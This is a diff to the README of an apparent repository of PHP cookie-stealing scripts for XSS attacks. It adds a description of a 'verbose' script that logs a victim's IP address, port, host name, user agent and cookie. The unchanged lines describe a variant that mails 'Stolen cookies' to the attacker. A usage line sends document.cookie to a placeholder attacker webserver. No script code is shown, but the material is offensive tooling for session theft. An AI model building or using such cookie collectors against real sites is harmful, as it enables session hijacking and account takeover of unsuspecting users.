@@ -5,6 +5,8 @@ PHP Cookie Stealing Scripts for use in XSS
 
 2. Cookiemail.php - This version code will mail the cookies to hacker mail using the PHP() mail function with subject “Stolen cookies”.
 
+3. Cookiesteal-v.php (verbose) - Collects the IP address, port number, host(usually computer-name), user agent and cookie.
+
 ## Usage
 
 Example: http://[Attacker Webserver]/cookiesteal-simple.php?c=document.cookie
